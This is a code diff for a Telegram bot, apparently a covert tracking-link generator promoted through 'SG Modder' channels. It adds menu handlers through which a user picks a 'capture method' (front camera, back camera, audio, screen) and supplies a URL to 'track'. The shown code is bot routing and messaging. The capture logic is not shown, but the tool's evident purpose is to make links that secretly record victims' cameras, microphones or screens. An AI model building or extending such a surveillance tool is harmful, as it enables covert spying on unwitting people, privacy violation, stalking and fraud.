+      await bot.editMessageText(helpText, { 
         chat_id: chatId,
         message_id: messageId,
         parse_mode: "HTML",
-        reply_markup: helpKeyboard.reply_markup
+        reply_markup: helpKeyboard.reply_markup 
       });
     } catch (error) {
-      console.log("Error editing message:", error);
-      // Fallback to sending a new message if editing fails
+      console.error("Error editing help message:", error);
+      
+      // Fallback to sending a new message
       await bot.sendMessage(chatId, helpText, { 
         parse_mode: "HTML",
         reply_markup: helpKeyboard.reply_markup 
@@ -751,25 +1055,107 @@ if (process.env.NODE_ENV !== "production") {
   
   bot.on('callback_query', async (callbackQuery) => {
     await bot.answerCallbackQuery(callbackQuery.id);
+    const chatId = callbackQuery.message.chat.id;
     
     if (callbackQuery.data === "crenew") {
-      await createNew(callbackQuery.message.chat.id);
+      await createNew(chatId, callbackQuery.message.message_id);
     } else if (callbackQuery.data === "help") {
-      // Show help message when the help button is clicked - edit the current message
-      await sendHelpMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+      // Show help message when the help button is clicked
+      await sendHelpMessage(chatId, callbackQuery.message.message_id);
     } else if (callbackQuery.data === "back_to_main") {
       // Go back to main menu
-      await sendWelcomeMessage(callbackQuery.message.chat.id, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
+      await sendWelcomeMessage(chatId, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
+    } else if (callbackQuery.data === "channels") {
+      // Show channels information by editing current message
+      await bot.editMessageText(
+        `<b>📢 SG Modder Channels 📢</b>\n\n` +
+        `Join our official channels for updates, tools and more!\n\n` +
+        `• <a href="https://t.me/sgmoddernew">@sgmoddernew</a> - Main channel\n` +
+        `• <a href="https://t.me/SG_Modder0">@SG_Modder0</a> - Updates channel\n` +
+        `• <a href="https://t.me/SG_Modder1">@SG_Modder1</a> - Tools channel\n\n` +
+        `<b>👨‍💻 Contact:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>`,
+        { 
+          chat_id: chatId, 
+          message_id: callbackQuery.message.message_id, 
+          parse_mode: "HTML",
+          reply_markup: JSON.stringify({
+            "inline_keyboard": [
+              [
+                { text: "🔙 Back", callback_data: "back_to_main" }
+              ]
+            ]
+          })
+        }
+      );
+    } else if (callbackQuery.data.startsWith("capture_")) {
+      // Handle capture method selection
+      const captureMethodId = callbackQuery.data.replace("capture_", "");
+      
+      if (captureMethodId === "cancel") {
+        // User canceled the capture method selection - edit current message
+        await bot.editMessageText(
+          `<b>❌ Operation canceled</b>\n\nUse /create to start again when you're ready.`,
+          { 
+            chat_id: chatId, 
+            message_id: callbackQuery.message.message_id,
+            parse_mode: "HTML",
+            reply_markup: JSON.stringify({
+              "inline_keyboard": [
+                [
+                  { text: "🔗 Try Again", callback_data: "crenew" }
+                ],
+                [
+                  { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
+                ]
+              ]
+            })
+          }
+        );
+      } else {
+        // Process the selected capture method - edit current message instead of sending new one
+        await processLinkWithCaptureMethod(chatId, captureMethodId, callbackQuery.message.message_id);
+      }
     }
   });
   
   bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     
-    // Handle reply to "Enter Your URL" message
-    if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
-      await createLink(chatId, msg.text);
-      return;
+    // Handle reply to capture method prompt or URL input
+    if (msg.reply_to_message && msg.reply_to_message.text) {
+      const replyText = msg.reply_to_message.text;
+      
+      // Check if this is a URL input after selecting a capture method
+      if (replyText.includes("This will capture:") || 
+          replyText.includes("Enter Your URL:") || 
+          replyText.includes("Enter URL to track")) {
+        console.log("Detected reply to URL prompt:", replyText);
+        
+        // Find which capture method was selected based on text content
+        let methodId = "full"; // Default
+        
+        if (replyText.includes("Front Camera")) {
+          methodId = "full";
+        } else if (replyText.includes("Back Camera")) {
+          methodId = "back";
+        } else if (replyText.includes("Minimal") || replyText.includes("No Camera")) {
+          methodId = "minimal";
+        } else if (replyText.includes("Audio")) {
+          methodId = "audio";
+        } else if (replyText.includes("Screen")) {
+          methodId = "screen";
+        }
+        
+        console.log("Creating link with method:", methodId);
+        // Create a link with the selected capture method
+        await createLink(chatId, msg.text, methodId);
+        return;
+      }
+      // Basic URL input handling (backward compatibility)
+      else if (replyText === "🌐 Enter Your URL") {
+        await createLink(chatId, msg.text);
+        return;
+      }
     }
     
     // Handle /start command
